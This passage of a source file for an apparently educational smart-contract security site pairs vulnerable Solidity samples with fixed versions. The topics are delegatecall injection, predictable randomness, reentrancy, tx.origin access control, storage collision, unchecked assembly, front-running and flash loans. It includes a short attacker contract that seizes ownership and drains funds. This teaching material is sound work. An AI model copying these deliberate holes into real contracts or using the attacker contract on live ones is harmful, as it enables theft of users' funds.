        // VULNERABILITY: User controls both target and data
        (bool success, ) = target.delegatecall(data); // [!code highlight]
        require(success, "Delegatecall failed");
    }
    
    // Function to receive Ether
    receive() external payable {
        balance += msg.value;
    }
    
    // Only owner should be able to withdraw
    function withdraw() external {
        require(msg.sender == owner, "Not the owner");
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title MaliciousContract
 * @dev Example of an attacker contract that exploits delegatecall
 */
contract MaliciousContract {
    address public owner;
    uint256 public balance;
    
    // This function will overwrite the proxy's owner variable
    function becomeOwner() external {
        owner = msg.sender; // [!code highlight]
    }
    
    // This function will drain the proxy's balance
    function drainFunds() external {
        // Since this runs in proxy context, address(this) is the proxy
        payable(msg.sender).transfer(address(this).balance); // [!code highlight]
    }
}`

const prevent_delegatecallInjection = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SecureProxy
 * @dev A secure proxy contract with delegatecall protection
 */
contract SecureProxy {
    address public owner;
    uint256 public balance;
    
    // Prevention: Whitelist of approved implementation contracts
    mapping(address => bool) public approvedImplementations; // [!code highlight]
    
    constructor() {
        owner = msg.sender;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Not the owner");
        _;
    }
    
    // Prevention: Only owner can add approved implementations
    function addApprovedImplementation(address impl) external onlyOwner {
        approvedImplementations[impl] = true; // [!code highlight]
    }
    
    // Prevention: Only owner can remove approved implementations
    function removeApprovedImplementation(address impl) external onlyOwner {
        approvedImplementations[impl] = false; // [!code highlight]
    }
    
    // Prevention: Secure delegatecall with multiple protections
    function execute(address target, bytes calldata data) external onlyOwner {
        // Prevention 1: Only approved implementations
        require(approvedImplementations[target], "Implementation not approved"); // [!code highlight]
        
        // Prevention 2: Validate function signature
        require(data.length >= 4, "Invalid calldata");
        bytes4 selector = bytes4(data[:4]);
        require(isAllowedSelector(selector), "Function not allowed"); // [!code highlight]
        
        // Prevention 3: Secure delegatecall
        (bool success, ) = target.delegatecall(data);
        require(success, "Delegatecall failed");
    }
    
    // Prevention: Whitelist of allowed function selectors
    function isAllowedSelector(bytes4 selector) internal pure returns (bool) {
        // Only allow specific, safe function selectors
        return selector == bytes4(keccak256("safeFunction()")) || // [!code highlight]
               selector == bytes4(keccak256("anotherSafeFunction(uint256)"));
    }
    
    // Function to receive Ether
    receive() external payable {
        balance += msg.value;
    }
    
    // Only owner can withdraw
    function withdraw() external onlyOwner {
        payable(owner).transfer(address(this).balance);
    }
}

/**
 * @title SafeImplementation
 * @dev Example of a safe implementation contract
 */
contract SafeImplementation {
    // Safe function that doesn't modify critical storage
    function safeFunction() external pure returns (string memory) {
        return "This is a safe function";
    }
    
    // Another safe function with parameters
    function anotherSafeFunction(uint256 value) external pure returns (uint256) {
        return value * 2;
    }
}`

export const sampleDelegatecallInjection =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_delegatecallInjection,
}

export const preventDelegatecallInjection =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_delegatecallInjection,
}

// 11-insecure-randomness
const sample_insecureRandomness = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableLottery
 * @dev A lottery contract vulnerable to randomness prediction
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableLottery {
    address public owner;
    address[] public players;
    uint256 public ticketPrice = 0.1 ether;
    address public lastWinner;
    
    constructor() {
        owner = msg.sender;
    }
    
    // Players can buy tickets to enter the lottery
    function buyTicket() external payable {
        require(msg.value == ticketPrice, "Incorrect ticket price");
        players.push(msg.sender);
    }
    
    // Vulnerable: Uses predictable blockchain data for randomness
    function pickWinner() external {
        require(msg.sender == owner, "Only owner can pick winner");
        require(players.length > 0, "No players in lottery");
        
        // VULNERABILITY: Predictable randomness using blockchain data
        uint256 randomNumber = uint256(keccak256(abi.encodePacked(
            block.timestamp,    // Miners can influence
            block.difficulty,   // Predictable
            players.length      // Known to everyone
        ))); // [!code highlight]
        
        uint256 winnerIndex = randomNumber % players.length;
        lastWinner = players[winnerIndex];
        
        // Send prize to winner
        payable(lastWinner).transfer(address(this).balance);
        
        // Reset for next round
        delete players;
    }
    
    // Vulnerable: Predictable NFT rarity generation
    function generateNFTRarity(uint256 tokenId) external view returns (string memory) {
        // VULNERABILITY: Attackers can predict rarity before minting
        uint256 randomValue = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            tokenId,
            msg.sender
        ))) % 100; // [!code highlight]
        
        if (randomValue < 5) return "Legendary";      // 5% chance
        if (randomValue < 20) return "Rare";          // 15% chance
        if (randomValue < 50) return "Uncommon";      // 30% chance
        return "Common";                              // 50% chance
    }
    
    function getPlayersCount() external view returns (uint256) {
        return players.length;
    }
}`

const prevent_insecureRandomness = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Interface for Chainlink VRF
interface VRFCoordinatorV2Interface {
    function requestRandomWords(
        bytes32 keyHash,
        uint64 subId,
        uint16 minimumRequestConfirmations,
        uint32 callbackGasLimit,
        uint32 numWords
    ) external returns (uint256 requestId);
}

/**
 * @title SecureLottery
 * @dev A secure lottery contract using Chainlink VRF and commit-reveal
 */
contract SecureLottery {
    address public owner;
    address[] public players;
    uint256 public ticketPrice = 0.1 ether;
    address public lastWinner;
    
    // Prevention: Chainlink VRF integration
    VRFCoordinatorV2Interface COORDINATOR;
    uint64 s_subscriptionId;
    bytes32 keyHash;
    uint32 callbackGasLimit = 100000;
    uint16 requestConfirmations = 3;
    uint256 public s_requestId;
    uint256 public randomResult; // [!code highlight]
    
    // Prevention: Commit-reveal scheme
    mapping(address => bytes32) public commitments;
    mapping(address => bool) public hasCommitted;
    uint256 public commitPhaseEnd;
    uint256 public revealPhaseEnd;
    bytes32 public combinedSeed; // [!code highlight]
    
    constructor(uint64 subscriptionId, address vrfCoordinator, bytes32 _keyHash) {
        owner = msg.sender;
        COORDINATOR = VRFCoordinatorV2Interface(vrfCoordinator);
        s_subscriptionId = subscriptionId;
        keyHash = _keyHash;
    }
    
    modifier onlyOwner() {
        require(msg.sender == owner, "Only owner");
        _;
    }
    
    // Prevention: Commit-reveal phase 1 - Players commit to participation
    function commitToLottery(bytes32 commitment) external payable {
        require(msg.value == ticketPrice, "Incorrect ticket price");
        require(block.timestamp < commitPhaseEnd, "Commit phase ended");
        require(!hasCommitted[msg.sender], "Already committed");
        
        commitments[msg.sender] = commitment; // [!code highlight]
        hasCommitted[msg.sender] = true;
        players.push(msg.sender);
    }
    
    // Prevention: Start new lottery round with commit-reveal
    function startLotteryRound() external onlyOwner {
        commitPhaseEnd = block.timestamp + 1 hours;
        revealPhaseEnd = commitPhaseEnd + 30 minutes;
        combinedSeed = bytes32(0);
    }
    
    // Prevention: Commit-reveal phase 2 - Players reveal their nonces
    function revealCommitment(uint256 nonce) external {
        require(block.timestamp >= commitPhaseEnd, "Commit phase not ended");
        require(block.timestamp < revealPhaseEnd, "Reveal phase ended");
        require(hasCommitted[msg.sender], "No commitment found");
        
        // Verify commitment
        bytes32 hash = keccak256(abi.encodePacked(msg.sender, nonce));
        require(hash == commitments[msg.sender], "Invalid reveal");
        
        // Add to combined seed
        combinedSeed = keccak256(abi.encodePacked(combinedSeed, nonce)); // [!code highlight]
    }
    
    // Prevention: Request secure randomness from Chainlink VRF
    function requestRandomWinner() external onlyOwner {
        require(block.timestamp >= revealPhaseEnd, "Reveal phase not ended");
        require(players.length > 0, "No players in lottery");
        
        s_requestId = COORDINATOR.requestRandomWords(
            keyHash,
            s_subscriptionId,
            requestConfirmations,
            callbackGasLimit,
            1
        ); // [!code highlight]
    }
    
    // Prevention: Callback function for Chainlink VRF
    function fulfillRandomWords(uint256 requestId, uint256[] memory randomWords) internal {
        require(requestId == s_requestId, "Invalid request");
        
        // Combine Chainlink VRF with commit-reveal seed
        uint256 finalRandom = uint256(keccak256(abi.encodePacked(
            randomWords[0],
            combinedSeed
        ))); // [!code highlight]
        
        uint256 winnerIndex = finalRandom % players.length;
        lastWinner = players[winnerIndex];
        
        // Send prize to winner
        payable(lastWinner).transfer(address(this).balance);
        
        // Reset for next round
        _resetLottery();
    }
    
    function _resetLottery() private {
        delete players;
        combinedSeed = bytes32(0);
        // Clear commitments for all players
        for (uint i = 0; i < players.length; i++) {
            hasCommitted[players[i]] = false;
            commitments[players[i]] = bytes32(0);
        }
    }
    
    function getPlayersCount() external view returns (uint256) {
        return players.length;
    }
}`

export const sampleInsecureRandomness =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_insecureRandomness,
}

export const preventInsecureRandomness =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_insecureRandomness,
}

// 12-nft-reentrancy
const sample_nftReentrancy = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract VulnerableNFTMarketplace is ERC721 {
    struct Listing {
        address seller;
        uint256 price;
        bool active;
    }
    
    mapping(uint256 => Listing) public listings;
    uint256 public nextTokenId = 1;
    
    constructor() ERC721("VulnerableNFT", "VNFT") {}
    
    function mint() external {
        _mint(msg.sender, nextTokenId);
        nextTokenId++;
    }
    
    function listNFT(uint256 tokenId, uint256 price) external {
        require(ownerOf(tokenId) == msg.sender, "Not owner");
        listings[tokenId] = Listing(msg.sender, price, true);
    }
    
    // Vulnerable: No reentrancy protection
    function buyNFT(uint256 tokenId) external payable {
        Listing storage listing = listings[tokenId];
        require(listing.active, "Not listed");
        require(msg.value >= listing.price, "Insufficient payment");
        
        address seller = listing.seller;
        uint256 price = listing.price;
        
        // Transfer NFT first (external call)
        safeTransferFrom(seller, msg.sender, tokenId);
        
        // State change after external call - VULNERABLE!
        listing.active = false;
        
        // Send payment (external call)
        (bool success, ) = seller.call{value: price}("");
        require(success, "Payment failed");
    }
}`

const prevent_nftReentrancy = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/security/Pausable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract SecureNFTMarketplace is ERC721, ReentrancyGuard, Pausable, Ownable {
    struct Listing {
        address seller;
        uint256 price;
        bool active;
    }
    
    mapping(uint256 => Listing) public listings;
    uint256 public nextTokenId = 1;
    
    constructor() ERC721("SecureNFT", "SNFT") {}
    
    function mint() external whenNotPaused {
        _mint(msg.sender, nextTokenId);
        nextTokenId++;
    }
    
    function listNFT(uint256 tokenId, uint256 price) external whenNotPaused {
        require(ownerOf(tokenId) == msg.sender, "Not owner");
        listings[tokenId] = Listing(msg.sender, price, true);
    }
    
    // Secure: Uses ReentrancyGuard and follows checks-effects-interactions
    function buyNFT(uint256 tokenId) external payable nonReentrant whenNotPaused {
        Listing storage listing = listings[tokenId];
        require(listing.active, "Not listed");
        require(msg.value >= listing.price, "Insufficient payment");
        
        address seller = listing.seller;
        uint256 price = listing.price;
        
        // CHECKS: Already done above
        
        // EFFECTS: Update state before external calls
        listing.active = false;
        
        // INTERACTIONS: External calls last
        safeTransferFrom(seller, msg.sender, tokenId);
        
        // Send payment with proper error handling
        (bool success, ) = seller.call{value: price}("");
        require(success, "Payment failed");
    }
    
    // Emergency functions
    function pause() external onlyOwner {
        _pause();
    }
    
    function unpause() external onlyOwner {
        _unpause();
    }
}`

export const sampleNftReentrancy =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_nftReentrancy,
}

export const preventNftReentrancy =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_nftReentrancy,
}

// 13-access-control
const sample_accessControl = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableWallet
 * @dev A simple wallet contract with access control vulnerabilities
 * WARNING: This contract is vulnerable for educational purposes
 */
contract VulnerableWallet {
    address public owner;
    uint256 public balance;
    mapping(address => uint256) public deposits;
    
    constructor() {
        owner = msg.sender;
    }
    
    // Deposit function - anyone can deposit
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        deposits[msg.sender] += msg.value;
        balance += msg.value;
    }
    
    // Vulnerable: Missing access control - anyone can withdraw!
    function withdraw(uint256 amount) external {
        require(amount <= balance, "Insufficient contract balance");
        
        // VULNERABILITY: No check if msg.sender is the owner
        balance -= amount;
        payable(msg.sender).transfer(amount);
    }
    
    // Vulnerable: Weak access control using tx.origin
    function emergencyWithdraw() external {
        // VULNERABILITY: Uses tx.origin instead of msg.sender
        require(tx.origin == owner, "Not the owner"); // [!code highlight]
        
        uint256 contractBalance = address(this).balance;
        payable(tx.origin).transfer(contractBalance);
    }
}`

const prevent_accessControl = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

/**
 * @title SecureWallet
 * @dev A secure wallet contract with proper access control
 */
contract SecureWallet is Ownable, ReentrancyGuard {
    uint256 public balance;
    mapping(address => uint256) public deposits;
    
    // Events for transparency
    event Deposit(address indexed user, uint256 amount);
    event Withdrawal(address indexed user, uint256 amount);
    
    constructor() {}
    
    // Deposit function - anyone can deposit
    function deposit() external payable {
        require(msg.value > 0, "Must send ETH");
        deposits[msg.sender] += msg.value;
        balance += msg.value;
        emit Deposit(msg.sender, msg.value);
    }
    
    // Secure: Proper access control with onlyOwner modifier
    function withdraw(uint256 amount) external onlyOwner nonReentrant {
        require(amount <= balance, "Insufficient contract balance");
        require(amount <= address(this).balance, "Insufficient ETH balance");
        
        // Prevention: Only owner can withdraw
        balance -= amount;
        payable(owner()).transfer(amount);
        emit Withdrawal(owner(), amount);
    }
    
    // Secure: Uses msg.sender with proper access control
    function emergencyWithdraw() external onlyOwner nonReentrant {
        // Prevention: Use msg.sender instead of tx.origin
        require(msg.sender == owner(), "Not the owner"); // [!code highlight]
        
        uint256 contractBalance = address(this).balance;
        balance = 0;
        payable(owner()).transfer(contractBalance);
        emit Withdrawal(owner(), contractBalance);
    }
    
    // Additional security: Allow owner to add authorized users
    mapping(address => bool) public authorizedUsers;
    
    modifier onlyAuthorized() {
        require(msg.sender == owner() || authorizedUsers[msg.sender], "Not authorized");
        _;
    }
    
    function addAuthorizedUser(address user) external onlyOwner {
        authorizedUsers[user] = true;
    }
    
    function removeAuthorizedUser(address user) external onlyOwner {
        authorizedUsers[user] = false;
    }
    
    // Secure function with multi-level access control
    function authorizedWithdraw(uint256 amount) external onlyAuthorized nonReentrant {
        require(amount <= deposits[msg.sender], "Insufficient personal balance");
        
        deposits[msg.sender] -= amount;
        balance -= amount;
        payable(msg.sender).transfer(amount);
        emit Withdrawal(msg.sender, amount);
    }
}`

export const sampleAccessControl =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_accessControl,
}

export const preventAccessControl =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_accessControl,
}

const sample_storageCollision = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// LogicV1: Initial contract
contract LogicV1 {
    uint256 public value; // slot 0
    function setValue(uint256 _value) public {
        value = _value;
    }
}

// LogicV2: Upgraded contract with storage collision
contract LogicV2 {
    address public owner; // slot 0 (collides with value in LogicV1)
    uint256 public value; // slot 1
    function setOwner(address _owner) public {
        owner = _owner;
    }
}
`;

const prevent_storageCollision = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// SecureUpgradeable: Safe pattern for upgradeable contracts
contract SecureUpgradeable {
    uint256 public value; // slot 0
    // Always append new variables at the end
    address public owner; // slot 1
    // Reserve storage gap for future upgrades
    uint256[50] private __gap;
}
`;

export const sampleStorageCollision =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_storageCollision,
}

export const preventStorageCollision =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_storageCollision,
}

// 15-inline-assembly
const sample_inlineAssembly = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title AssemblyDemo
 * @dev Demonstrates how inline assembly can bypass Solidity safety checks
 */
contract AssemblyDemo {
    uint256 public value;

    // Unsafe increment using inline assembly (no overflow check)
    function increment(uint256 x) public {
        assembly {
            // Directly add to storage slot 0 (where 'value' is stored)
            sstore(0, add(sload(0), x))
        }
    }
}
`;

const prevent_inlineAssembly = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SafeIncrement
 * @dev Shows how to safely increment a value without inline assembly
 */
contract SafeIncrement {
    uint256 public value;

    // Safe increment using high-level Solidity (with overflow check)
    function increment(uint256 x) public {
        value += x; // Solidity 0.8+ checks for overflow automatically
    }
}
`;

export const sampleInlineAssembly =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_inlineAssembly,
}

export const preventInlineAssembly =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_inlineAssembly,
}

// 16-front-running
const sample_frontRunning = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title VulnerableAuction
 * @dev Demonstrates a simple front-running vulnerability
 */
contract VulnerableAuction {
    address public highestBidder;
    uint256 public highestBid;

    // Anyone can place a bid by sending Ether
    function bid() external payable {
        require(msg.value > highestBid, "Bid too low");
        // Vulnerable: No protection against front-running
        highestBidder = msg.sender;
        highestBid = msg.value;
    }
}
`;

const prevent_frontRunning = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title SealedBidAuction
 * @dev Prevents front-running using a commit-reveal scheme
 */
contract SealedBidAuction {
    mapping(address => bytes32) public commitments;
    mapping(address => uint256) public revealedBids;
    uint256 public revealEnd;
    address public highestBidder;
    uint256 public highestBid;

    constructor(uint256 _revealDuration) {
        revealEnd = block.timestamp + _revealDuration;
    }

    // Commit phase: users submit a hash of their bid
    function commitBid(bytes32 commitment) external {
        commitments[msg.sender] = commitment;
    }

    // Reveal phase: users reveal their bid and value
    function revealBid(uint256 bid, bytes32 secret) external payable {
        require(block.timestamp <= revealEnd, "Reveal phase ended");
        require(commitments[msg.sender] == keccak256(abi.encodePacked(bid, secret)), "Invalid commitment");
        require(msg.value == bid, "Incorrect value sent");
        revealedBids[msg.sender] = bid;
        if (bid > highestBid) {
            highestBid = bid;
            highestBidder = msg.sender;
        }
    }
}
`;

export const sampleFrontRunning =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_frontRunning,
}

export const preventFrontRunning =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_frontRunning,
}

// 17-flash-loan
const sample_flashLoan = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleLendingPool {
    mapping(address => uint256) public balances;
    
    // Deposit Ether into the pool
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // Vulnerable flash loan function
    function flashLoan(uint256 amount) external {
        uint256 poolBalance = address(this).balance;
        require(amount <= poolBalance, "Not enough funds");
        
        // Send funds to borrower
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
        
        // Call borrower back (no checks!)
        IFlashLoanReceiver(msg.sender).executeFlashLoan{value: 0}(amount);
        
        // No check if funds are returned!
    }
}

interface IFlashLoanReceiver {
    function executeFlashLoan(uint256 amount) external payable;
}`

// Flash Loan - Safe Example with Balance Check
const prevent_flashLoan = `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SafeLendingPool {
    mapping(address => uint256) public balances;
    
    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }
    
    // Safe flash loan with balance check
    function flashLoan(uint256 amount) external {
        uint256 poolBalanceBefore = address(this).balance;
        require(amount <= poolBalanceBefore, "Not enough funds");
        
        (bool sent, ) = msg.sender.call{value: amount}("");
        require(sent, "Transfer failed");
        
        IFlashLoanReceiver(msg.sender).executeFlashLoan{value: 0}(amount);
        
        // Ensure all funds are returned
        require(address(this).balance >= poolBalanceBefore, "Flash loan not repaid");
    }
}

interface IFlashLoanReceiver {
    function executeFlashLoan(uint256 amount) external payable;
}`

export const sampleFlashLoan =
{
  id: "sample",
  title: "Sample",
  filename: "sample.sol",
  language: "solidity",
  code: sample_flashLoan,
}

export const preventFlashLoan =
{
  id: "prevent",
  title: "Prevent",
  filename: "prevent.sol",
  language: "solidity",
  code: prevent_flashLoan,
}